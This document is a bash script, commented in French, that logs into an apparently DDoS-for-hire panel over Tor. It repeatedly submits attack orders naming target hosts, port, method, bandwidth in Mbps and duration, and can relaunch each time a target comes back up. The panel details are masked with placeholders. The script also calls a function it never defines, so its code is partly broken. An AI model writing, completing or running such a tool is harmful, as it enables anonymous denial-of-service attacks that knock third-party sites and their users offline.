#!/bin/bash

# version sécurisée, remplacer les xxx par de vraies valeurs
# POUR FAIRE FONCTIONNER CE SCRIPT IL FAUT :
# remplacer les *** par de vraies valeurs
# remplacer le xxx par de vraies valeurs

usage="$(basename "$0") [-m methode] [-P protocole] [-d duration] [-p port] [-b bandwidth] [-i interval] [-o occurences] [-h host file] [-H host] [-u user] [-s password] [-w wait] [-v] [-S] [-T] [-n] -- 

where:
    -m  définit la méthode
    -P  definit le protocole 
    -d  fixe la duree 
    -p  fixe le port
    -b  fixe la puissance 
    -i  fixe l'intervalle en secondes
    -o  fixe le nombre d'occurences
    -h  le fichier contenant la ou les host
    -H  une seule IP
    -u  le user applicatif
    -s  le mot de passe du user
    -w  fixe la duree avant le lancement (facultatif)
    -v  mode verbeux
    -S  stoppe toutpour le compte en paramètre
    -T  utilise Tor
    -n  execute seulement si le site est up

Remarques:
- Tor : Certaines adresses IP du réseau Tor sont reconnues 
Dans ce cas, il vaut mieux arrêter le script et le relancer afin de se reconnecter à Tor et d'obtenir une nouvelle IP.
- Arrêt : Le paramètre \"-S\" permet de stopper tout pour un compte donné. Pour effectuer une telle opération, 
il faut passer obligatoirement les paramètres u, s, S, et de façon facultative w et T.

Exemple d'utilisation : 
./kick.sh -d 3600 -p 0 -b 3000 -i 3610 -o 10 -H xxx -u user -s password -T
"

occurences=1
duration=600
port=0
bandwidth=1000
interval=0
method=***
tor=false
torstring=''
verbose=false
new=false
protocol="***"

# headers
h_get="'method: GET'"
h_post="'method: POST'"
h_accept_encoding="'accept-encoding: gzip,deflate,sdch'"
h_host="'host: ***'"
h_accept_language="'accept-language: en-US,en;q=0.8,fr;q=0.6'"
h_user_agent="'user-agent: xxx'"
h_accept="'accept: xxx'"
h_url_login="'url: /***'"
h_url_base="'url: /***'"
h_version="'version: HTTP/1.1'"
h_scheme="'scheme: https'"

h_origin="'origin: ***'"
h_content_type="'content-type: application/x-www-form-urlencoded'"
h_cache_control="'cache-control: max-age=0'"

# page
page_login="'***'"
page_base="'***'"

headers_get_commun=" -H "$h_get" -H "$h_accept_encoding" -H "$h_host" -H "$h_accept_language" -H "$h_user_agent" -H "$h_accept" -H "$h_version" -H "$h_scheme
headers_post_commun=" -H "$h_origin" -H "$h_post" -H "$h_accept_encoding" -H "$h_host" -H "$h_accept_language" -H "$h_user_agent" -H "$h_content_type" -H "$h_accept" -H "$h_cache_control" -H "$h_version" -H "$h_scheme


# cette fonction prend en argument une date au format hh:mmhss et affiche un compte à rebours
function countdown() {
   $verbose && echo "countdown() arg="$1
   OLD_IFS=$IFS
   IFS=:
   set -- $*
   secs=$(( ${1#0} * 3600 + ${2#0} * 60 + ${3#0} ))
   while [ $secs -gt 0 ]
   do
      sleep 1 &
      printf "\r%02d:%02d:%02d" $((secs/3600)) $(( (secs/60)%60)) $((secs%60))
      secs=$(( $secs - 1 ))
      wait
   done
   IFS=$OLD_IFS
   echo
}

function checkHostStatus() {

   echo "checkHostStatus() arg=$1"
   alive=false
   for k in $(seq 1 ${#liste[@]})
   do
      host="${liste[$k-1]}"
      echo "host : $host"
      echo [$(date +%Y-%m-%d\ %H:%M:%S:%N | cut -c -23)] "tests arg=$host"
      alive=false
      #result=$(curl -m 5 --retry 2 --retry-delay 1 --head "$host" 2>&1)
      echo "premier test"
      result1=$(curl http://www.isitdownrightnow.com/check.php?domain=$(echo $host | cut -c 5-) | grep "UP")
      status1=$?
      echo "second test"
      result2=$(curl http://www.downforeveryoneorjustme.com/$host | grep "is up")
      status2=$?
      echo "status1 : $status1"
      echo "status2 : $status2"
      if [ $status1 -eq 0 ] || [ $status2 -eq 0 ]
      then
         echo [$(date +%Y-%m-%d\ %H:%M:%S:%N | cut -c -23)] "host $host is alive"
         alive=true
         echo "envoi mail"
         echo "host $host is alive" | mail -s "alarmUp" xxxxxxx@xxxxx.xx
         return
      fi
      echo [$(date +%Y-%m-%d\ %H:%M:%S:%N | cut -c -23)] "host $host is down"
      alive=false
   done

}

# cette fonction vérifie la connexion à Tor et l'ouvre si nécessaire
function tor() {
   # détection de la connexion à Tor, si elle n'est pas établie on la démarre
   if [[ $tor == true ]]
   then
      torstring="--socks5 127.0.0.1:9150"
      if nc -z 127.0.0.1 9150 2>/dev/null
      then
         echo "port 9150 is open, Tor est demarre"
      else
         torstatus=false
         echo "port 9150 is closed, on demarre Tor..."
         /home/alex/tor/tor-browser_en-US/start-tor-browser &
         echo "on verifie que Tor a bien demarre"
         sleep 5
         for i in {1..3}
         do
            if nc -z 127.0.0.1 9150 2>/dev/null
            then
               echo "Tor est demarre"
               torstatus=true
               break
            else
               echo "Tor n'est toujours pas demarre on attend un peu"
               sleep 3s
            fi
         done
         if ! $torstatus
         then
            echo "Tor n'arrive pas a demarrer, on quitte"
            exit 1
         fi
      fi
      #echo "IP : "$(curl $torstring -s "http://www.ip-adress.com/ip_tracer/" -H "User-Agent: *" | grep "My IP is:" | awk -F " " '{print $NF}' | awk -F "<" '{print $1}')
   fi
}

# cette fonction effectue une athentification sur le site avec l'utilisateur et mot de passe
# passés en paramètres. On lui passe également un fichier pour écrire les cookies
function loginFirst() {

   # première requête curl qui fait un GET sur la page de login
   # et enregistre les cookies recus en retour dans cookies.txt
   commande="curl "$torstring" "$page_login" "$headers_get_commun" -H "$h_url_login" --compressed --head -s -c cookies_$1.txt > /dev/null"
   $verbose && echo "commande : "$commande
   echo -n "execution du GET sur la page de login..."
   eval $commande
   echo " [OK]"

   # POST d'authentification : on soumet le formulaire login et mot de passe avec les cookies recupérés précédemment
   length_login=$(($(expr length $1)+$(expr length $2)+34))
   commande="curl "$torstring" "$page_login" "$headers_post_commun" -H "$h_url_login" -H 'content-length: "$length_login"' --data  'xxx=xxx&xxx="$1"&password="$2"' --compressed -b cookies_$1.txt"
   $verbose && echo "commande : "$commande
   echo -n "execution du POST d'authentification pour l'utilisateur "$1"..."
   eval $commande
   echo " [OK]"
}

# cette fonction interrompt l'exécution du script pendant une durée passée en paramètre
# un compte à rebours est affiché pendant l'attente
# le paramètre doit contenir un nombre suivi d'une des lettres s, m, ou h pour seconde, minute ou heure
# par exemple "10s" ou "1h"
function pause() {
   $verbose && echo "pause() arg="$1
   param=$1
   waitlength=${#param}
   unit=$(expr substr $1 $waitlength 1)
   value=$(expr substr $1 1 $((waitlength-1)))
   if  [ "$unit" = "h" ]
   then
      wait=$((value * 3600))
   else
      if  [ "$unit" = "m" ]
      then
         wait=$((value * 60))
      fi
   fi
   date=$(echo - | awk -v "S="$wait '{printf "%02d:%02d:%02d",S/(60*60),S%(60*60)/60,S%60}')
   echo "lancement dans "
   countdown $date
}

# fonction à implémenter et à appeler lorsque le script est interrompu
function finish {
   #TODO : stopper 
   # il faut refaire une authentification avant
   echo "execution du script terminee"
}
trap finish EXIT

#__________________________________________________________________________________

# si aucun paramètre n'est renseigné on affiche l'aide
if [ $# -eq 0 ]
   then
      echo "$usage"
      exit 1
fi

# lecture des paramètres passés en entrée
while getopts m:P:d:p:b:i:o:h:H:u:s:w:vSTn opts; do
   case ${opts} in
      m) 
         method=${OPTARG} ;;
      P) 
         protocol=${OPTARG} ;;
      d) 
         duration=${OPTARG} ;;
      p) 
         port=${OPTARG} ;;
      b) 
         bandwidth=${OPTARG} ;;
      i) 
         interval=${OPTARG} ;;
      o) 
         occurences=${OPTARG} ;;
      h) 
         ipfile=${OPTARG} 
         liste=(`cat $ipfile`)
         ;;
      H)
         liste=("${OPTARG}");;
      u) 
         user=${OPTARG} ;;
      s) 
         password=${OPTARG} ;;
      w) 
         wait=${OPTARG} ;;
      v) 
         verbose=true ;;
      S) 
         stop=true ;;
      T) 
         tor=true ;;
      n) 
         new=true ;;
      *) 
         echo "$usage"
         exit 1;;
   esac
done

if [ $occurences -eq 0 ]
   then
      max=1000
   else
      max=$occurences
fi

# calcul de la bande passante totale : nombre d'IP x puissance par IP
bandwidth=$((${#liste[@]}*$bandwidth))
$verbose && echo "bandwidth totale : "$bandwidth

# calcul du content-length
length=$(($(expr length $duration)+$(expr length $bandwidth)+$(expr length $port)+$(expr length $method)+$(expr length $protocol)+520))
for j in $(seq 1 ${#liste[@]})
do
   length=$(($length+$(expr length "${liste[$j-1]}")))
done

# affichage du récapitulatif
if [ -n "$stop" ]
then
   echo "demande d'arret"
else
   echo "recapitulatif : "
   if [[ ! -z "$wait" ]]
   then
      echo "debut dans "$wait
   fi
   echo "cible : "${liste[@]}" - port : "$port
   echo "type "$method" de puissance "$bandwidth" Mbps d'une duree de "$duration" secondes "
   if [[ $occurences -eq 0 ]]
   then
      echo "infini"
   else
      echo "operation lancee "$occurences" fois"
   fi
   if [[ !$interval -eq 0 ]]
   then
      echo "L'intervalle entre 2 actions est de "$interval" secondes"
   fi
fi

# si le paramètre de demarrage différé est renseigné, on attend le temps indiqué
if [ -n "$wait" ]
then
   pause $wait
fi

i=1
while [ "$i" -le "$max" ] 

do

   if $new
   then
      while true
      do
         checkIfSitesAlive ${liste[@]}
         if $alive
         then
            echo "host is up"
            break
         else
            echo "host is down"
         fi
         attente=$((RANDOM % 60 + 60))
         echo "on attend $attente s"
         sleep $attente
      done
   fi  

   # suppression des anciens fichiers
   echo "suppression des fichiers"
   rm cookies_$user.txt
   rm base_$user.txt
   rm output_$user.txt

   tor
   loginFirst $user $password

   if [ -n "$stop" ]
   then
      echo -n "on stoppe..."
      commande="curl "$torstring" "$page_base" "$headers_post_commun" -H "$h_url_base" -H 'content-length: xxx' --data 'xxx=xxx' --compressed -s -b cookies_$user.txt > /dev/null"
      $verbose && echo "commande : "$commande
      eval $commande
      echo " [OK]"
      exit
   fi

   # GET sur le formulaire, ce GET est nécessaire pour obtenir le token
   commande="curl "$torstring" "$page_base" "$headers_get_commun" -H "$h_url_base" --compressed -s -b cookies_$user.txt > base_$user.txt "
   $verbose && echo "commande : "$commande
   echo -n "execution du GET sur le formulaire..."
   eval $commande
   echo " [OK]"

   token=$(grep "token" base_$user.txt | awk -F"\"" '{print $(NF-1)}')
   $verbose && echo "token : "$token

   # POST du formulaire
   commande="curl "$torstring" "$page_base" "$headers_post_commun" -H "$h_url_base" -H 'content-length: "$length"' --data 'xxx=xxx&token=$token&xxx=xxx&xxx=xxx"
   for ((j=1; j<=${#liste[@]}; j++)) 
   do 
      commande=$commande"&xxx"$j"="${liste[$j-1]}
   done
   for ((j=$((${#liste[@]}+1)); j<=10; j++)) 
   do 
      commande=$commande"&xxx"$j"="
   done
   commande=$commande"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' --compressed -b cookies_$user.txt -s -o output_$user.txt"
   $verbose && echo "commande : "$commande
   echo -n "execution du POST de lancement le "$(date '+%d %b %Y')" a "$(date '+%Hh%Mmin%Ss')"..."
   eval $commande
   
   id=$(grep "xxx=\"xxx\"" output_$user.txt | awk -F"\"" '{print $(NF-11)}')
   if [[ "$id" == "" ]]
   then
      echo " [ERROR]"
   else
      echo " [OK]"
   fi
   echo "id : "$id

   # si on n'en est pas à la dernière occurence on affiche des infos
   if [ ! "$i" -eq "$max" ]
   then
      $verbose && echo "date approximative de lancement : le "$(date '+%d %b %Y' -d $interval" seconds")" a "$(date '+%Hh%Mmin%Ss' -d $interval" seconds")
      echo "reprise dans "
      nextts=$(echo - | awk -v "S="$interval '{printf "%02d:%02d:%02d",S/(60*60),S%(60*60)/60,S%60}')
      countdown $nextts
      echo "fin d'attente"
   fi

   ((i++))

done

